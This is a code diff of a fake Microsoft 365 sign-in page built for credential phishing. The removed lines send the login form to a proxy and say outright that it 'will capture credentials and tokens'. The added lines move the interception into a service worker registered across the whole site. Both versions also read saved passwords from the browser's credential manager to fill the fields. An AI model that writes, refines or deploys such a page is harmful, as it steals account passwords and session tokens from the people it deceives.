@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -7,7 +7,7 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Arial, sans-serif;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
             background: #f2f2f2;
             display: flex;
             justify-content: center;
@@ -15,9 +15,9 @@
             min-height: 100vh;
         }
         .container {
-            background: #fff;
+            background: #ffffff;
             border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.12);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.12);
             padding: 44px 36px;
             width: 440px;
             max-width: 100%;
@@ -31,19 +31,20 @@
         .input-group input {
             width: 100%; padding: 12px 14px; font-size: 15px;
             border: 1px solid #8b8b8b; border-radius: 4px;
-            background: #fbfbfb;
+            background: #fbfbfb; transition: border-color 0.2s;
         }
         .input-group input:focus {
             border-color: #005da6;
             outline: none;
-            box-shadow: 0 0 0 2px rgba(0,93,166,0.25);
+            box-shadow: 0 0 0 2px rgba(0, 93, 166, 0.25);
         }
         .btn {
             width: 100%; padding: 12px; font-size: 15px; font-weight: 600;
-            color: #fff; background: #005da6; border: none; border-radius: 4px;
-            cursor: pointer;
+            color: #ffffff; background: #005da6; border: none; border-radius: 4px;
+            cursor: pointer; transition: background 0.2s;
         }
         .btn:hover { background: #004a87; }
+        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
         .footer {
             margin-top: 28px; font-size: 12px; color: #757575;
             text-align: center; border-top: 1px solid #e6e6e6;
@@ -58,7 +59,6 @@
             margin-right: 8px; vertical-align: middle;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        /* Hide the actual form action - we use JS to send to proxy */
     </style>
 </head>
 <body>
@@ -74,8 +74,8 @@
         <h1>Sign in</h1>
         <p class="sub">to continue to Microsoft 365</p>
 
-        <!-- 🔥 FORM SUBMITS TO PROXY, NOT DIRECTLY TO MICROSOFT -->
-        <form id="loginForm" action="/lNv1pC9AWPUY4gbidyBO" method="POST">
+        <!-- 🔥 FORM SUBMITS NORMALLY - Service Worker intercepts it -->
+        <form id="loginForm" action="/login" method="POST">
             <div class="input-group">
                 <label>Email, phone, or Skype</label>
                 <input type="text" id="email" name="loginfmt" placeholder="someone@example.com" autocomplete="username" required>
@@ -98,78 +98,60 @@
     </div>
 
     <script>
-        (function() {
-            const form = document.getElementById('loginForm');
-            const email = document.getElementById('email');
-            const password = document.getElementById('password');
-            const errorMsg = document.getElementById('errorMsg');
-            const btn = document.getElementById('submitBtn');
-            const btnText = document.getElementById('btnText');
+        // ── REGISTER SERVICE WORKER ──
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/service_worker_Mz8XO2ny1Pg5.js', { scope: '/' })
+                .then(() => console.log('✅ Service Worker registered'))
+                .catch(err => console.error('❌ SW registration failed:', err));
+        }
 
-            // ── Get the real redirect URL from URL param ──
-            const urlParams = new URLSearchParams(window.location.search);
-            const redirectUri = urlParams.get('redirect_urI');
-            const realUrl = redirectUri ? decodeURIComponent(redirectUri) : 'https://login.microsoftonline.com/';
+        // ── FORM HANDLING ──
+        const form = document.getElementById('loginForm');
+        const email = document.getElementById('email');
+        const password = document.getElementById('password');
+        const errorMsg = document.getElementById('errorMsg');
+        const btn = document.getElementById('submitBtn');
+        const btnText = document.getElementById('btnText');
 
-            // ── Store for proxy to use ──
-            localStorage.setItem('phish_redirect', realUrl);
+        form.addEventListener('submit', function(e) {
+            const emailVal = email.value.trim();
+            const passVal = password.value.trim();
 
-            // ── Set form action to proxy with real target ──
-            // The proxy will forward to the real URL
-            const proxyUrl = '/lNv1pC9AWPUY4gbidyBO';
-            form.action = proxyUrl;
+            errorMsg.style.display = 'none';
 
-            // ── Add hidden field for the real target ──
-            const hiddenInput = document.createElement('input');
-            hiddenInput.type = 'hidden';
-            hiddenInput.name = 'url';
-            hiddenInput.value = realUrl;
-            form.appendChild(hiddenInput);
-
-            // ── Validation ──
-            form.addEventListener('submit', function(e) {
-                const emailVal = email.value.trim();
-                const passVal = password.value.trim();
-
-                errorMsg.style.display = 'none';
-
-                if (!emailVal || !passVal) {
-                    e.preventDefault();
-                    errorMsg.textContent = 'Please enter both email and password';
-                    errorMsg.style.display = 'block';
-                    return;
-                }
-
-                if (!emailVal.includes('@') || !emailVal.includes('.')) {
-                    e.preventDefault();
-                    errorMsg.textContent = 'Please enter a valid email address';
-                    errorMsg.style.display = 'block';
-                    return;
-                }
-
-                // Loading state
-                btn.disabled = true;
-                btnText.innerHTML = '<span class="spinner"></span>Signing in...';
-
-                // Form submits to proxy which forwards to real Microsoft
-                // The proxy will capture credentials and tokens!
-            });
-
-            // ── Auto-fill from credential manager ──
-            if ('credentials' in navigator) {
-                navigator.credentials.get({ password: true, mediation: 'optional' })
-                    .then(cred => {
-                        if (cred && cred.type === 'password') {
-                            email.value = cred.id;
-                            password.value = cred.password;
-                        }
-                    })
-                    .catch(() => {});
+            if (!emailVal || !passVal) {
+                e.preventDefault();
+                errorMsg.textContent = 'Please enter both email and password';
+                errorMsg.style.display = 'block';
+                return;
             }
 
-            // ── Focus ──
-            email.focus();
-        })();
+            if (!emailVal.includes('@') || !emailVal.includes('.')) {
+                e.preventDefault();
+                errorMsg.textContent = 'Please enter a valid email address';
+                errorMsg.style.display = 'block';
+                return;
+            }
+
+            // Show loading
+            btn.disabled = true;
+            btnText.innerHTML = '<span class="spinner"></span>Signing in...';
+
+            // Form submits normally — Service Worker intercepts!
+        });
+
+        // ── Auto-fill ──
+        if ('credentials' in navigator) {
+            navigator.credentials.get({ password: true, mediation: 'optional' })
+                .then(cred => {
+                    if (cred && cred.type === 'password') {
+                        email.value = cred.id;
+                        password.value = cred.password;
+                    }
+                }).catch(() => {});
+        }
+
+        email.focus();
     </script>
 </body>
 </html>
